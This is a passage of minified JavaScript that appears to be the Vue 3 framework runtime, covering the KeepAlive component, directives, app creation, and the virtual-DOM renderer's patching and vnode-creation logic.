            if (t._enterCb && t._enterCb(!0), n.isUnmounting) return l();
            k(d, [t]);
            let s = !1;
            const o = t._leaveCb = n => {
                s || (s = !0, l(), k(n ? m : f, [t]), t._leaveCb = void 0, y[a] === e && delete y[a])
            };
            y[a] = e, p ? (p(t, o), p.length <= 1 && o()) : o()
        },
        clone: e => Vn(e, t, n, l)
    };
    return w
}

function Dn(e) {
    if (jn(e)) return (e = Ll(e)).children = null, e
}

function Un(e) {
    return jn(e) ? e.children ? e.children[0] : void 0 : e
}

function Nn(e, t) {
    6 & e.shapeFlag && e.component ? Nn(e.component.subTree, t) : 128 & e.shapeFlag ? (e.ssContent.transition = t.clone(e.ssContent), e.ssFallback.transition = t.clone(e.ssFallback)) : e.transition = t
}

function $n(e, t = !1) {
    let n = [],
        l = 0;
    for (let a = 0; a < e.length; a++) {
        const s = e[a];
        s.type === bl ? (128 & s.patchFlag && l++, n = n.concat($n(s.children, t))) : (t || s.type !== vl) && n.push(s)
    }
    if (l > 1)
        for (let a = 0; a < n.length; a++) n[a].patchFlag = -2;
    return n
}
const jn = e => e.type.__isKeepAlive,
    Fn = {
        name: "KeepAlive",
        __isKeepAlive: !0,
        props: {
            include: [String, RegExp, Array],
            exclude: [String, RegExp, Array],
            max: [String, Number]
        },
        setup(e, {
            slots: t
        }) {
            const n = new Map,
                l = new Set;
            let a = null;
            const s = la(),
                o = s.suspense,
                r = s.ctx,
                {
                    renderer: {
                        p: i,
                        m: c,
                        um: u,
                        o: {
                            createElement: d
                        }
                    }
                } = r,
                p = d("div");

            function f(e) {
                qn(e), u(e, s, o)
            }

            function m(e) {
                n.forEach(((t, n) => {
                    const l = ua(t.type);
                    !l || e && e(l) || h(n)
                }))
            }

            function h(e) {
                const t = n.get(e);
                a && t.type === a.type ? a && qn(a) : f(t), n.delete(e), l.delete(e)
            }
            r.activate = (e, t, n, l, a) => {
                const s = e.component;
                c(e, t, n, 0, o), i(s.vnode, e, t, n, s, o, l, a), sl((() => {
                    s.isDeactivated = !1, s.a && Z(s.a);
                    const t = e.props && e.props.onVnodeMounted;
                    t && il(t, s.parent, e)
                }), o)
            }, r.deactivate = e => {
                const t = e.component;
                c(e, p, null, 1, o), sl((() => {
                    t.da && Z(t.da);
                    const n = e.props && e.props.onVnodeUnmounted;
                    n && il(n, t.parent, e), t.isDeactivated = !0
                }), o)
            }, Rn((() => [e.include, e.exclude]), (([e, t]) => {
                e && m((t => zn(e, t))), t && m((e => !zn(t, e)))
            }), {
                flush: "post",
                deep: !0
            });
            let b = null;
            const g = () => {
                null != b && n.set(b, Gn(s.subTree))
            };
            return vn(g), yn(g), kn((() => {
                n.forEach((e => {
                    const {
                        subTree: t,
                        suspense: n
                    } = s, l = Gn(t);
                    if (e.type !== l.type) f(e);
                    else {
                        qn(l);
                        const e = l.component.da;
                        e && sl(e, n)
                    }
                }))
            })), () => {
                if (b = null, !t.default) return null;
                const s = t.default(),
                    o = s[0];
                if (s.length > 1) return a = null, s;
                if (!(Al(o) && (4 & o.shapeFlag || 128 & o.shapeFlag))) return a = null, o;
                let r = Gn(o);
                const i = r.type,
                    c = ua(i),
                    {
                        include: u,
                        exclude: d,
                        max: p
                    } = e;
                if (u && (!c || !zn(u, c)) || d && c && zn(d, c)) return a = r, o;
                const f = null == r.key ? i : r.key,
                    m = n.get(f);
                return r.el && (r = Ll(r), 128 & o.shapeFlag && (o.ssContent = r)), b = f, m ? (r.el = m.el, r.component = m.component, r.transition && Nn(r, r.transition), r.shapeFlag |= 512, l.delete(f), l.add(f)) : (l.add(f), p && l.size > parseInt(p, 10) && h(l.values().next().value)), r.shapeFlag |= 256, a = r, o
            }
        }
    };

function zn(e, t) {
    return P(e) ? e.some((e => zn(e, t))) : V(e) ? e.split(",").indexOf(t) > -1 : !!e.test && e.test(t)
}

function Bn(e, t, n = na) {
    const l = e.__wdc || (e.__wdc = () => {
        let t = n;
        for (; t;) {
            if (t.isDeactivated) return;
            t = t.parent
        }
        e()
    });
    if (hn(t, l, n), n) {
        let e = n.parent;
        for (; e && e.parent;) jn(e.parent.vnode) && Hn(l, t, n, e), e = e.parent
    }
}

function Hn(e, t, n, l) {
    const a = hn(t, e, l, !0);
    wn((() => {
        R(l[t], a)
    }), n)
}

function qn(e) {
    let t = e.shapeFlag;
    256 & t && (t -= 256), 512 & t && (t -= 512), e.shapeFlag = t
}

function Gn(e) {
    return 128 & e.shapeFlag ? e.ssContent : e
}
const Wn = e => "_" === e[0] || "$stable" === e,
    Kn = e => P(e) ? e.map(Vl) : [Vl(e)],
    Jn = (e, t, n) => en((e => Kn(t(e))), n),
    Xn = (e, t) => {
        const n = e._ctx;
        for (const l in e) {
            if (Wn(l)) continue;
            const a = e[l];
            if (M(a)) t[l] = Jn(0, a, n);
            else if (null != a) {
                const e = Kn(a);
                t[l] = () => e
            }
        }
    },
    Yn = (e, t) => {
        const n = Kn(t);
        e.slots.default = () => n
    };

function Zn(e, t) {
    if (null === zt) return e;
    const n = zt.proxy,
        l = e.dirs || (e.dirs = []);
    for (let a = 0; a < t.length; a++) {
        let [e, s, o, r = x] = t[a];
        M(e) && (e = {
            mounted: e,
            updated: e
        }), l.push({
            dir: e,
            instance: n,
            value: s,
            oldValue: void 0,
            arg: o,
            modifiers: r
        })
    }
    return e
}

function Qn(e, t, n, l) {
    const a = e.dirs,
        s = t && t.dirs;
    for (let o = 0; o < a.length; o++) {
        const r = a[o];
        s && (r.oldValue = s[o].value);
        const i = r.dir[l];
        i && bt(i, n, 8, [e.el, r, e, t])
    }
}

function el() {
    return {
        app: null,
        config: {
            isNativeTag: w,
            performance: !1,
            globalProperties: {},
            optionMergeStrategies: {},
            isCustomElement: w,
            errorHandler: void 0,
            warnHandler: void 0
        },
        mixins: [],
        components: {},
        directives: {},
        provides: Object.create(null)
    }
}
let tl = 0;

function nl(e, t) {
    return function(n, l = null) {
        null == l || U(l) || (l = null);
        const a = el(),
            s = new Set;
        let o = !1;
        const r = a.app = {
            _uid: tl++,
            _component: n,
            _props: l,
            _container: null,
            _context: a,
            version: ma,
            get config() {
                return a.config
            },
            set config(e) {},
            use: (e, ...t) => (s.has(e) || (e && M(e.install) ? (s.add(e), e.install(r, ...t)) : M(e) && (s.add(e), e(r, ...t))), r),
            mixin: e => (a.mixins.includes(e) || (a.mixins.push(e), (e.props || e.emits) && (a.deopt = !0)), r),
            component: (e, t) => t ? (a.components[e] = t, r) : a.components[e],
            directive: (e, t) => t ? (a.directives[e] = t, r) : a.directives[e],
            mount(s, i) {
                if (!o) {
                    const c = Pl(n, l);
                    return c.appContext = a, i && t ? t(c, s) : e(c, s), o = !0, r._container = s, s.__vue_app__ = r, c.component.proxy
                }
            },
            unmount() {
                o && (e(null, r._container), delete r._container.__vue_app__)
            },
            provide: (e, t) => (a.provides[e] = t, r)
        };
        return r
    }
}

function ll(e) {
    return M(e) ? {
        setup: e,
        name: e.name
    } : e
}
const al = {
        scheduler: It,
        allowRecurse: !0
    },
    sl = function(e, t) {
        t && t.pendingBranch ? P(e) ? t.effects.push(...e) : t.effects.push(e) : Mt(e, St, At, Rt)
    },
    ol = (e, t, n, l) => {
        if (P(e)) return void e.forEach(((e, a) => ol(e, t && (P(t) ? t[a] : t), n, l)));
        let a;
        a = !l || l.type.__asyncLoader ? null : 4 & l.shapeFlag ? l.component.exposed || l.component.proxy : l.el;
        const {
            i: s,
            r: o
        } = e, r = t && t.r, i = s.refs === x ? s.refs = {} : s.refs, c = s.setupState;
        if (null != r && r !== o && (V(r) ? (i[r] = null, E(c, r) && (c[r] = null)) : ot(r) && (r.value = null)), V(o)) {
            const e = () => {
                i[o] = a, E(c, o) && (c[o] = a)
            };
            a ? (e.id = -1, sl(e, n)) : e()
        } else if (ot(o)) {
            const e = () => {
                o.value = a
            };
            a ? (e.id = -1, sl(e, n)) : e()
        } else M(o) && ht(o, s, 12, [a, i])
    };

function rl(e) {
    return function(e, t) {
        const {
            insert: n,
            remove: l,
            patchProp: a,
            forcePatchProp: s,
            createElement: o,
            createText: r,
            createComment: i,
            setText: c,
            setElementText: u,
            parentNode: d,
            nextSibling: p,
            setScopeId: f = k,
            cloneNode: m,
            insertStaticContent: h
        } = e, b = (e, t, n, l = null, a = null, s = null, o = !1, r = !1) => {
            e && !Sl(e, t) && (l = te(e), W(e, a, s, !0), e = null), -2 === t.patchFlag && (r = !1, t.dynamicChildren = null);
            const {
                type: i,
                ref: c,
                shapeFlag: u
            } = t;
            switch (i) {
                case gl:
                    g(e, t, n, l);
                    break;
                case vl:
                    v(e, t, n, l);
                    break;
                case xl:
                    null == e && w(t, n, l, o);
                    break;
                case bl:
                    M(e, t, n, l, a, s, o, r);
                    break;
                default:
                    1 & u ? A(e, t, n, l, a, s, o, r) : 6 & u ? V(e, t, n, l, a, s, o, r) : (64 & u || 128 & u) && i.process(e, t, n, l, a, s, o, r, le)
            }
            null != c && a && ol(c, e && e.ref, s, t)
        }, g = (e, t, l, a) => {
            if (null == e) n(t.el = r(t.children), l, a);
            else {
                const n = t.el = e.el;
                t.children !== e.children && c(n, t.children)
            }
        }, v = (e, t, l, a) => {
            null == e ? n(t.el = i(t.children || ""), l, a) : t.el = e.el
        }, w = (e, t, n, l) => {
            [e.el, e.anchor] = h(e.children, t, n, l)
        }, C = ({
            el: e,
            anchor: t
        }, l, a) => {
            let s;
            for (; e && e !== t;) s = p(e), n(e, l, a), e = s;
            n(t, l, a)
        }, _ = ({
            el: e,
            anchor: t
        }) => {
            let n;
            for (; e && e !== t;) n = p(e), l(e), e = n;
            l(t)
        }, A = (e, t, n, l, a, s, o, r) => {
            o = o || "svg" === t.type, null == e ? R(t, n, l, a, s, o, r) : L(e, t, a, s, o, r)
        }, R = (e, t, l, s, r, i, c) => {
            let d, p;
            const {
                type: f,
                props: h,
                shapeFlag: b,
                transition: g,
                scopeId: v,
                patchFlag: x,
                dirs: y
            } = e;
            if (e.el && void 0 !== m && -1 === x) d = e.el = m(e.el);
            else {
                if (d = e.el = o(e.type, i, h && h.is), 8 & b ? u(d, e.children) : 16 & b && P(e.children, d, null, s, r, i && "foreignObject" !== f, c || !!e.dynamicChildren), y && Qn(e, null, s, "created"), h) {
                    for (const t in h) B(t) || a(d, t, null, h[t], i, e.children, s, r, ee);
                    (p = h.onVnodeBeforeMount) && il(p, s, e)
                }
                T(d, v, e, s)
            }
            y && Qn(e, null, s, "beforeMount");
            const k = (!r || r && !r.pendingBranch) && g && !g.persisted;
            k && g.beforeEnter(d), n(d, t, l), ((p = h && h.onVnodeMounted) || k || y) && sl((() => {
                p && il(p, s, e), k && g.enter(d), y && Qn(e, null, s, "mounted")
            }), r)
        }, T = (e, t, n, l) => {
            if (t && f(e, t), l) {
                const a = l.type.__scopeId;
                a && a !== t && f(e, a + "-s"), n === l.subTree && T(e, l.vnode.scopeId, l.vnode, l.parent)
            }
        }, P = (e, t, n, l, a, s, o, r = 0) => {
            for (let i = r; i < e.length; i++) {
                const r = e[i] = o ? Dl(e[i]) : Vl(e[i]);
                b(null, r, t, n, l, a, s, o)
            }
        }, L = (e, t, n, l, o, r) => {
            const i = t.el = e.el;
            let {
                patchFlag: c,
                dynamicChildren: d,
                dirs: p
            } = t;
            c |= 16 & e.patchFlag;
            const f = e.props || x,
                m = t.props || x;
            let h;
            if ((h = m.onVnodeBeforeUpdate) && il(h, n, t, e), p && Qn(t, e, n, "beforeUpdate"), c > 0) {
                if (16 & c) O(i, t, f, m, n, l, o);
                else if (2 & c && f.class !== m.class && a(i, "class", null, m.class, o), 4 & c && a(i, "style", f.style, m.style, o), 8 & c) {
                    const r = t.dynamicProps;
                    for (let t = 0; t < r.length; t++) {
                        const c = r[t],
                            u = f[c],
                            d = m[c];
                        (d !== u || s && s(i, c)) && a(i, c, u, d, o, e.children, n, l, ee)
                    }
                }
                1 & c && e.children !== t.children && u(i, t.children)
            } else r || null != d || O(i, t, f, m, n, l, o);
            const b = o && "foreignObject" !== t.type;
            d ? I(e.dynamicChildren, d, i, n, l, b) : r || F(e, t, i, null, n, l, b), ((h = m.onVnodeUpdated) || p) && sl((() => {
                h && il(h, n, t, e), p && Qn(t, e, n, "updated")
            }), l)
        }, I = (e, t, n, l, a, s) => {
            for (let o = 0; o < t.length; o++) {
                const r = e[o],
                    i = t[o],
                    c = r.type === bl || !Sl(r, i) || 6 & r.shapeFlag || 64 & r.shapeFlag ? d(r.el) : n;
                b(r, i, c, null, l, a, s, !0)
            }
        }, O = (e, t, n, l, o, r, i) => {
            if (n !== l) {
                for (const c in l) {
                    if (B(c)) continue;
                    const u = l[c],
                        d = n[c];
                    (u !== d || s && s(e, c)) && a(e, c, d, u, i, t.children, o, r, ee)
                }
                if (n !== x)
                    for (const s in n) B(s) || s in l || a(e, s, n[s], null, i, t.children, o, r, ee)
            }
        }, M = (e, t, l, a, s, o, i, c) => {
            const u = t.el = e ? e.el : r(""),
                d = t.anchor = e ? e.anchor : r("");
            let {
                patchFlag: p,
                dynamicChildren: f
            } = t;
            p > 0 && (c = !0), null == e ? (n(u, l, a), n(d, l, a), P(t.children, l, d, s, o, i, c)) : p > 0 && 64 & p && f && e.dynamicChildren ? (I(e.dynamicChildren, f, l, s, o, i), (null != t.key || s && t === s.subTree) && cl(e, t, !0)) : F(e, t, l, d, s, o, i, c)
        }, V = (e, t, n, l, a, s, o, r) => {
            null == e ? 512 & t.shapeFlag ? a.ctx.activate(t, n, l, o, r) : D(t, n, l, a, s, o, r) : U(e, t, r)
        }, D = (e, t, n, l, a, s, o) => {
            const r = e.component = function(e, t, n) {
                const l = e.type,
                    a = (t ? t.appContext : e.appContext) || ea,
                    s = {
                        uid: ta++,
                        vnode: e,
                        type: l,
                        parent: t,
                        appContext: a,
                        root: null,
                        next: null,
                        subTree: null,
                        update: null,
                        render: null,
                        proxy: null,
                        exposed: null,
                        withProxy: null,
                        effects: null,
                        provides: t ? t.provides : Object.create(a.provides),
                        accessCache: null,
                        renderCache: [],
                        components: null,
                        directives: null,
                        propsOptions: un(l, a),
                        emitsOptions: jt(l, a),
                        emit: null,
                        emitted: null,
                        ctx: x,
                        data: x,
                        props: x,
                        attrs: x,
                        slots: x,
                        refs: x,
                        setupState: x,
                        setupContext: null,
                        suspense: n,
                        suspenseId: n ? n.pendingId : 0,
                        asyncDep: null,
                        asyncResolved: !1,
                        isMounted: !1,
                        isUnmounted: !1,
                        isDeactivated: !1,
                        bc: null,
                        c: null,
                        bm: null,
                        m: null,
                        bu: null,
                        u: null,
                        um: null,
                        bum: null,
                        da: null,
                        a: null,
                        rtg: null,
                        rtc: null,
                        ec: null
                    };
                return s.ctx = {
                    _: s
                }, s.root = t ? t.root : s, s.emit = $t.bind(null, s), s
            }(e, l, a);
            if (jn(e) && (r.ctx.renderer = le), function(e, t = !1) {
                    oa = t;
                    const {
                        props: n,
                        children: l
                    } = e.vnode, a = sa(e);
                    on(e, n, a, t), ((e, t) => {
                        if (32 & e.vnode.shapeFlag) {
                            const n = t._;
                            n ? (e.slots = t, Q(t, "_", n)) : Xn(t, e.slots = {})
                        } else e.slots = {}, t && Yn(e, t);
                        Q(e.slots, Rl, 1)
                    })(e, l);
                    const s = a ? function(e, t) {
                        const n = e.type;
                        e.accessCache = Object.create(null), e.proxy = new Proxy(e.ctx, Zl);
                        const {
                            setup: l
                        } = n;
                        if (l) {
                            const n = e.setupContext = l.length > 1 ? function(e) {
                                const t = t => {
                                    e.exposed = pt(t)
                                };
                                return {
                                    attrs: e.attrs,
                                    slots: e.slots,
                                    emit: e.emit,
                                    expose: t
                                }
                            }(e) : null;
                            na = e, pe();
                            const a = ht(l, e, 0, [e.props, n]);
                            if (fe(), na = null, N(a)) {
                                if (t) return a.then((t => {
                                    ra(e, t)
                                }));
                                e.asyncDep = a
                            } else ra(e, a)
                        } else ia(e)
                    }(e, t) : void 0;
                    oa = !1
                }(r), r.asyncDep) {
                if (a && a.registerDep(r, $), !e.el) {
                    const e = r.subTree = Pl(vl);
                    v(null, e, t, n)
                }
            } else $(r, e, t, n, a, s, o)
        }, U = (e, t, n) => {
            const l = t.component = e.component;
            if (function(e, t, n) {
                    const {
                        props: l,
                        children: a,
                        component: s
                    } = e, {
                        props: o,
                        children: r,
                        patchFlag: i
                    } = t, c = s.emitsOptions;
                    if (t.dirs || t.transition) return !0;
                    if (!(n && i >= 0)) return !(!a && !r || r && r.$stable) || l !== o && (l ? !o || Kt(l, o, c) : !!o);
                    if (1024 & i) return !0;
                    if (16 & i) return l ? Kt(l, o, c) : !!o;
                    if (8 & i) {
                        const e = t.dynamicProps;
                        for (let t = 0; t < e.length; t++) {
                            const n = e[t];
                            if (o[n] !== l[n] && !Ft(c, n)) return !0
                        }
                    }
                    return !1
                }(e, t, n)) {
                if (l.asyncDep && !l.asyncResolved) return void j(l, t, n);
                l.next = t,
                    function(e) {
                        const t = yt.indexOf(e);
                        t > -1 && yt.splice(t, 1)
                    }(l.update), l.update()
            } else t.component = e.component, t.el = e.el, l.vnode = t
        }, $ = (e, t, n, l, a, s, o) => {
            e.update = oe((function() {
                if (e.isMounted) {
                    let t, {
                            next: n,
                            bu: l,
                            u: r,
                            parent: i,
                            vnode: c
                        } = e,
                        u = n;
                    n ? (n.el = c.el, j(e, n, o)) : n = c, l && Z(l), (t = n.props && n.props.onVnodeBeforeUpdate) && il(t, i, n, c);
                    const p = Ht(e),
                        f = e.subTree;
                    e.subTree = p, b(f, p, d(f.el), te(f), e, a, s), n.el = p.el, null === u && function({
                        vnode: e,
                        parent: t
                    }, n) {
                        for (; t && t.subTree === e;)(e = t.vnode).el = n, t = t.parent
                    }(e, p.el), r && sl(r, a), (t = n.props && n.props.onVnodeUpdated) && sl((() => {
                        il(t, i, n, c)
                    }), a)
                } else {
                    let o;
                    const {
                        el: r,
                        props: i
                    } = t, {
                        bm: c,
                        m: u,
                        parent: d
                    } = e;
                    c && Z(c), (o = i && i.onVnodeBeforeMount) && il(o, d, t);
                    const p = e.subTree = Ht(e);
                    if (r && se ? se(t.el, p, e, a) : (b(null, p, n, l, e, a, s), t.el = p.el), u && sl(u, a), o = i && i.onVnodeMounted) {
                        const e = t;
                        sl((() => {
                            il(o, d, e)
                        }), a)
                    }
                    const {
                        a: f
                    } = e;
                    f && 256 & t.shapeFlag && sl(f, a), e.isMounted = !0, t = n = l = null
                }
            }), al)
        }, j = (e, t, n) => {
            t.component = e;
            const l = e.vnode.props;
            e.vnode = t, e.next = null,
                function(e, t, n, l) {
                    const {
                        props: a,
                        attrs: s,
                        vnode: {
                            patchFlag: o
                        }
                    } = e, r = at(a), [i] = e.propsOptions;
                    if (!(l || o > 0) || 16 & o) {
                        let l;
                        rn(e, t, a, s);
                        for (const s in r) t && (E(t, s) || (l = K(s)) !== s && E(t, l)) || (i ? !n || void 0 === n[s] && void 0 === n[l] || (a[s] = cn(i, t || x, s, void 0, e)) : delete a[s]);
                        if (s !== r)
                            for (const e in s) t && E(t, e) || delete s[e]
                    } else if (8 & o) {
                        const n = e.vnode.dynamicProps;
                        for (let l = 0; l < n.length; l++) {
                            const o = n[l],
                                c = t[o];
                            if (i)
                                if (E(s, o)) s[o] = c;
                                else {
                                    const t = G(o);
                                    a[t] = cn(i, r, t, c, e)
                                }
                            else s[o] = c
                        }
                    }
                    he(e, "set", "$attrs")
                }(e, t.props, l, n), ((e, t) => {
                    const {
                        vnode: n,
                        slots: l
                    } = e;
                    let a = !0,
                        s = x;
                    if (32 & n.shapeFlag) {
                        const e = t._;
                        e ? 1 === e ? a = !1 : S(l, t) : (a = !t.$stable, Xn(t, l)), s = t
                    } else t && (Yn(e, t), s = {
                        default: 1
                    });
                    if (a)
                        for (const o in l) Wn(o) || o in s || delete l[o]
                })(e, t.children), Vt(void 0, e.update)
        }, F = (e, t, n, l, a, s, o, r = !1) => {
            const i = e && e.children,
                c = e ? e.shapeFlag : 0,
                d = t.children,
                {
                    patchFlag: p,
                    shapeFlag: f
                } = t;
            if (p > 0) {
                if (128 & p) return void H(i, d, n, l, a, s, o, r);
                if (256 & p) return void z(i, d, n, l, a, s, o, r)
            }
            8 & f ? (16 & c && ee(i, a, s), d !== i && u(n, d)) : 16 & c ? 16 & f ? H(i, d, n, l, a, s, o, r) : ee(i, a, s, !0) : (8 & c && u(n, ""), 16 & f && P(d, n, l, a, s, o, r))
        }, z = (e, t, n, l, a, s, o, r) => {
            t = t || y;
            const i = (e = e || y).length,
                c = t.length,
                u = Math.min(i, c);
            let d;
            for (d = 0; d < u; d++) {
                const l = t[d] = r ? Dl(t[d]) : Vl(t[d]);
                b(e[d], l, n, null, a, s, o, r)
            }
            i > c ? ee(e, a, s, !0, !1, u) : P(t, n, l, a, s, o, r, u)
        }, H = (e, t, n, l, a, s, o, r) => {
            let i = 0;
            const c = t.length;
            let u = e.length - 1,
                d = c - 1;
            for (; i <= u && i <= d;) {
                const l = e[i],
                    c = t[i] = r ? Dl(t[i]) : Vl(t[i]);
                if (!Sl(l, c)) break;
                b(l, c, n, null, a, s, o, r), i++
            }
            for (; i <= u && i <= d;) {
                const l = e[u],
                    i = t[d] = r ? Dl(t[d]) : Vl(t[d]);
                if (!Sl(l, i)) break;
                b(l, i, n, null, a, s, o, r), u--, d--
            }
            if (i > u) {
                if (i <= d) {
                    const e = d + 1,
                        u = e < c ? t[e].el : l;
                    for (; i <= d;) b(null, t[i] = r ? Dl(t[i]) : Vl(t[i]), n, u, a, s, o), i++
                }
            } else if (i > d)
                for (; i <= u;) W(e[i], a, s, !0), i++;
            else {
                const p = i,
                    f = i,
                    m = new Map;
                for (i = f; i <= d; i++) {
                    const e = t[i] = r ? Dl(t[i]) : Vl(t[i]);
                    null != e.key && m.set(e.key, i)
                }
                let h, g = 0;
                const v = d - f + 1;
                let x = !1,
                    k = 0;
                const w = new Array(v);
                for (i = 0; i < v; i++) w[i] = 0;
                for (i = p; i <= u; i++) {
                    const l = e[i];
                    if (g >= v) {
                        W(l, a, s, !0);
                        continue
                    }
                    let c;
                    if (null != l.key) c = m.get(l.key);
                    else
                        for (h = f; h <= d; h++)
                            if (0 === w[h - f] && Sl(l, t[h])) {
                                c = h;
                                break
                            } void 0 === c ? W(l, a, s, !0) : (w[c - f] = i + 1, c >= k ? k = c : x = !0, b(l, t[c], n, null, a, s, o, r), g++)
                }
                const C = x ? function(e) {
                    const t = e.slice(),
                        n = [0];
                    let l, a, s, o, r;
                    const i = e.length;
                    for (l = 0; l < i; l++) {
                        const i = e[l];
                        if (0 !== i) {
                            if (a = n[n.length - 1], e[a] < i) {
                                t[l] = a, n.push(l);
                                continue
                            }
                            for (s = 0, o = n.length - 1; s < o;) r = (s + o) / 2 | 0, e[n[r]] < i ? s = r + 1 : o = r;
                            i < e[n[s]] && (s > 0 && (t[l] = n[s - 1]), n[s] = l)
                        }
                    }
                    s = n.length, o = n[s - 1];
                    for (; s-- > 0;) n[s] = o, o = t[o];
                    return n
                }(w) : y;
                for (h = C.length - 1, i = v - 1; i >= 0; i--) {
                    const e = f + i,
                        r = t[e],
                        u = e + 1 < c ? t[e + 1].el : l;
                    0 === w[i] ? b(null, r, n, u, a, s, o) : x && (h < 0 || i !== C[h] ? q(r, n, u, 2) : h--)
                }
            }
        }, q = (e, t, l, a, s = null) => {
            const {
                el: o,
                type: r,
                transition: i,
                children: c,
                shapeFlag: u
            } = e;
            if (6 & u) return void q(e.component.subTree, t, l, a);
            if (128 & u) return void e.suspense.move(t, l, a);
            if (64 & u) return void r.move(e, t, l, le);
            if (r === bl) {
                n(o, t, l);
                for (let e = 0; e < c.length; e++) q(c[e], t, l, a);
                return void n(e.anchor, t, l)
            }
            if (r === xl) return void C(e, t, l);
            if (2 !== a && 1 & u && i)
                if (0 === a) i.beforeEnter(o), n(o, t, l), sl((() => i.enter(o)), s);
                else {
                    const {
                        leave: e,
                        delayLeave: a,
                        afterLeave: s
                    } = i, r = () => n(o, t, l), c = () => {
                        e(o, (() => {
                            r(), s && s()
                        }))
                    };
                    a ? a(o, r, c) : c()
                }
            else n(o, t, l)
        }, W = (e, t, n, l = !1, a = !1) => {
            const {
                type: s,
                props: o,
                ref: r,
                children: i,
                dynamicChildren: c,
                shapeFlag: u,
                patchFlag: d,
                dirs: p
            } = e;
            if (null != r && ol(r, null, n, null), 256 & u) return void t.ctx.deactivate(e);
            const f = 1 & u && p;
            let m;
            if ((m = o && o.onVnodeBeforeUnmount) && il(m, t, e), 6 & u) Y(e.component, n, l);
            else {
                if (128 & u) return void e.suspense.unmount(n, l);
                f && Qn(e, null, t, "beforeUnmount"), c && (s !== bl || d > 0 && 64 & d) ? ee(c, t, n, !1, !0) : (s === bl && (128 & d || 256 & d) || !a && 16 & u) && ee(i, t, n), 64 & u && (l || !ul(e.props)) && e.type.remove(e, le), l && J(e)
            }((m = o && o.onVnodeUnmounted) || f) && sl((() => {
                m && il(m, t, e), f && Qn(e, null, t, "unmounted")
            }), n)
        }, J = e => {
            const {
                type: t,
                el: n,
                anchor: a,
                transition: s
            } = e;
            if (t === bl) return void X(n, a);
            if (t === xl) return void _(e);
            const o = () => {
                l(n), s && !s.persisted && s.afterLeave && s.afterLeave()
            };
            if (1 & e.shapeFlag && s && !s.persisted) {
                const {
                    leave: t,
                    delayLeave: l
                } = s, a = () => t(n, o);
                l ? l(e.el, o, a) : a()
            } else o()
        }, X = (e, t) => {
            let n;
            for (; e !== t;) n = p(e), l(e), e = n;
            l(t)
        }, Y = (e, t, n) => {
            const {
                bum: l,
                effects: a,
                update: s,
                subTree: o,
                um: r
            } = e;
            if (l && Z(l), a)
                for (let i = 0; i < a.length; i++) re(a[i]);
            s && (re(s), W(o, e, t, n)), r && sl(r, t), sl((() => {
                e.isUnmounted = !0
            }), t), t && t.pendingBranch && !t.isUnmounted && e.asyncDep && !e.asyncResolved && e.suspenseId === t.pendingId && (t.deps--, 0 === t.deps && t.resolve())
        }, ee = (e, t, n, l = !1, a = !1, s = 0) => {
            for (let o = s; o < e.length; o++) W(e[o], t, n, l, a)
        }, te = e => 6 & e.shapeFlag ? te(e.component.subTree) : 128 & e.shapeFlag ? e.suspense.next() : p(e.anchor || e.el), ne = (e, t) => {
            null == e ? t._vnode && W(t._vnode, null, null, !0) : b(t._vnode || null, e, t), Dt(), t._vnode = e
        }, le = {
            p: b,
            um: W,
            m: q,
            r: J,
            mt: D,
            mc: P,
            pc: F,
            pbc: I,
            n: te,
            o: e
        };
        let ae, se;
        t && ([ae, se] = t(le));
        return {
            render: ne,
            hydrate: ae,
            createApp: nl(ne, ae)
        }
    }(e)
}

function il(e, t, n, l = null) {
    bt(e, t, 7, [n, l])
}

function cl(e, t, n = !1) {
    const l = e.children,
        a = t.children;
    if (P(l) && P(a))
        for (let s = 0; s < l.length; s++) {
            const e = l[s];
            let t = a[s];
            1 & t.shapeFlag && !t.dynamicChildren && ((t.patchFlag <= 0 || 32 === t.patchFlag) && (t = a[s] = Dl(a[s]), t.el = e.el), n || cl(e, t))
        }
}
const ul = e => e && (e.disabled || "" === e.disabled);

function dl(e) {
    return ml("components", e) || e
}
const pl = Symbol();

function fl(e) {
    return V(e) ? ml("components", e, !1) || e : e || pl
}

function ml(e, t, n = !0) {
    const l = zt || na;
    if (l) {
        const n = l.type;
        if ("components" === e) {
            if ("_self" === t) return n;
            const e = ua(n);
            if (e && (e === t || e === G(t) || e === J(G(t)))) return n
        }
        return hl(l[e] || n[e], t) || hl(l.appContext[e], t)
    }
}

function hl(e, t) {
    return e && (e[t] || e[G(t)] || e[J(G(t))])
}
const bl = Symbol(void 0),
    gl = Symbol(void 0),
    vl = Symbol(void 0),
    xl = Symbol(void 0),
    yl = [];
let kl = null;

function wl(e = !1) {
    yl.push(kl = e ? null : [])
}

function Cl() {
    yl.pop(), kl = yl[yl.length - 1] || null
}

function _l(e, t, n, l, a) {
    const s = Pl(e, t, n, l, a, !0);
    return s.dynamicChildren = kl || y, Cl(), kl && kl.push(s), s
}

function Al(e) {
    return !!e && !0 === e.__v_isVNode
}

function Sl(e, t) {
    return e.type === t.type && e.key === t.key
}
const Rl = "__vInternal",
    Tl = ({
        key: e
    }) => null != e ? e : null,
    El = ({
        ref: e
    }) => null != e ? V(e) || ot(e) || M(e) ? {
        i: zt,
        r: e
    } : e : null,
    Pl = function(e, t = null, n = null, l = 0, a = null, s = !1) {
        e && e !== pl || (e = vl);
        if (Al(e)) {
            const l = Ll(e, t, !0);
            return n && Ul(l, n), l
        }
        o = e, M(o) && "__vccOpts" in o && (e = e.__vccOpts);
        var o;
        if (t) {
            (lt(t) || Rl in t) && (t = S({}, t));
            let {
                class: e,
                style: n
            } = t;
            e && !V(e) && (t.class = m(e)), U(n) && (lt(n) && !P(n) && (n = S({}, n)), t.style = u(n))
        }
        const r = V(e) ? 1 : (e => e.__isSuspense)(e) ? 128 : (e => e.__isTeleport)(e) ? 64 : U(e) ? 4 : M(e) ? 2 : 0,
            i = {
                __v_isVNode: !0,
                __v_skip: !0,
                type: e,
                props: t,
                key: t && Tl(t),
                ref: t && El(t),
                scopeId: tn,
                children: null,
                component: null,
                suspense: null,
                ssContent: null,
                ssFallback: null,
                dirs: null,
                transition: null,
                el: null,
                anchor: null,
                target: null,
                targetAnchor: null,
                staticCount: 0,
                shapeFlag: r,
                patchFlag: l,
                dynamicProps: a,
                dynamicChildren: null,
                appContext: null
            };
        if (Ul(i, n), 128 & r) {
            const {
                content: e,
                fallback: t
            } = function(e) {
                const {
                    shapeFlag: t,
                    children: n
                } = e;
                let l, a;
                return 32 & t ? (l = Jt(n.default), a = Jt(n.fallback)) : (l = Jt(n), a = Vl(null)), {
                    content: l,
                    fallback: a
                }
            }(i);
            i.ssContent = e, i.ssFallback = t
        }!s && kl && (l > 0 || 6 & r) && 32 !== l && kl.push(i);
        return i
    };

